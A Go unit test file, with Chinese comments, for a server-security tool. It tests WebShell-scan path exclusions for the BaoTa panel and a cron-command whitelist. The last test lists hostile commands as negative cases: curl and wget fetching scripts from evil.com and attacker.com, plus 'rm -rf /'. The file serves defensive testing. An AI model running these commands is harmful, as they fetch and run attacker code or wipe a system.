package security

import (
	"testing"
)

// ============================================================
// 测试: WebShell 扫描排除 — 宝塔自身代码目录
// ============================================================

func TestIsWebShellScanExcluded_BaotaPaths(t *testing.T) {
	excludedPaths := []string{
		"/www/server/panel",
		"/www/server/panel/class/core.py",
		"/www/server/panel/plugin/safe/safe.py",
		"/www/server/panel/BTPanel/index.py",
		"/www/server/panel/pyenv/bin/python3",
		"/www/server/panel/script/cron.py",
		"/www/server/panel/task/bt_task.py",
		"/www/server/bt",
	}

	for _, path := range excludedPaths {
		if !IsWebShellScanExcluded(path) {
			t.Errorf("WebShell 扫描应排除宝塔路径: %s", path)
		}
	}
}

// ============================================================
// 测试: WebShell 扫描排除 — 用户网站目录不排除
// ============================================================

func TestIsWebShellScanExcluded_UserWebsiteNotExcluded(t *testing.T) {
	userPaths := []string{
		"/www/wwwroot/mysite/index.php",
		"/www/wwwroot/mysite/uploads/shell.php",
		"/var/www/html/index.php",
	}

	for _, path := range userPaths {
		if IsWebShellScanExcluded(path) {
			t.Errorf("WebShell 扫描不应排除用户网站路径: %s", path)
		}
	}
}

// ============================================================
// 测试: WebShell 扫描排除 — 通配符匹配（CMS 缓存目录）
// ============================================================

func TestIsWebShellScanExcluded_GlobPatterns(t *testing.T) {
	// matchGlobPath 要求路径段数与模式段数完全一致
	// 模式 /www/wwwroot/*/runtime 匹配 /www/wwwroot/site1/runtime（5 段）
	globPaths := []string{
		"/www/wwwroot/site1/runtime",
		"/www/wwwroot/site2/cache",
		"/www/wwwroot/site3/temp",
		"/www/wwwroot/myapp/storage/framework",
	}

	for _, path := range globPaths {
		if !IsWebShellScanExcluded(path) {
			t.Errorf("WebShell 扫描应通过通配符排除路径: %s", path)
		}
	}
}

// ============================================================
// 测试: WebShell 扫描排除 — 通配符不匹配的路径不排除
// ============================================================

func TestIsWebShellScanExcluded_GlobNotMatched(t *testing.T) {
	nonMatchedPaths := []string{
		"/www/wwwroot/site1/public/index.php",
		"/www/wwwroot/site2/app/controller.php",
	}

	for _, path := range nonMatchedPaths {
		if IsWebShellScanExcluded(path) {
			t.Errorf("WebShell 扫描不应排除非匹配通配符路径: %s", path)
		}
	}
}

// ============================================================
// 测试: IsUserWebsitePath — 用户网站目录检测
// ============================================================

func TestIsUserWebsitePath(t *testing.T) {
	websitePaths := []string{
		"/www/wwwroot/mysite/",
		"/www/wwwroot/site1/index.php",
	}
	for _, path := range websitePaths {
		if !IsUserWebsitePath(path) {
			t.Errorf("路径 %s 应识别为用户网站目录", path)
		}
	}

	nonWebsitePaths := []string{
		"/www/server/panel/",
		"/var/www/html/",
		"/etc/passwd",
	}
	for _, path := range nonWebsitePaths {
		if IsUserWebsitePath(path) {
			t.Errorf("路径 %s 不应识别为用户网站目录", path)
		}
	}
}

// ============================================================
// 测试: Cron 白名单 — 宝塔计划任务
// ============================================================

func TestIsCronWhitelisted_BaotaCronCommands(t *testing.T) {
	whitelistedCommands := []string{
		"/www/server/panel/script/backup_site.py",
		"/www/server/panel/logs/cleanup.py",
		"/etc/init.d/bt restart",
		"/usr/local/bin/bt default",
		"bt restart",
		"bt start",
		"bt stop",
		"bt 14",
		"nginx -s reload",
		"/www/server/panel/pyenv/bin/python /www/server/panel/class/panelPlugin.py",
		"systemctl reload nginx",
		"systemctl reload php-fpm",
	}

	for _, cmd := range whitelistedCommands {
		if !IsCronWhitelisted(cmd) {
			t.Errorf("宝塔 Cron 命令应被白名单匹配: %s", cmd)
		}
	}
}

// ============================================================
// 测试: Cron 白名单 — 可疑命令不被白名单匹配
// ============================================================

func TestIsCronWhitelisted_SuspiciousCommand(t *testing.T) {
	suspiciousCommands := []string{
		"/tmp/malicious.sh",
		"curl http://evil.com/script.sh | bash",
		"wget http://attacker.com/backdoor.py -O /tmp/shell.py",
		"rm -rf /",
	}

	for _, cmd := range suspiciousCommands {
		if IsCronWhitelisted(cmd) {
			t.Errorf("可疑 Cron 命令不应被白名单匹配: %s", cmd)
		}
	}
}
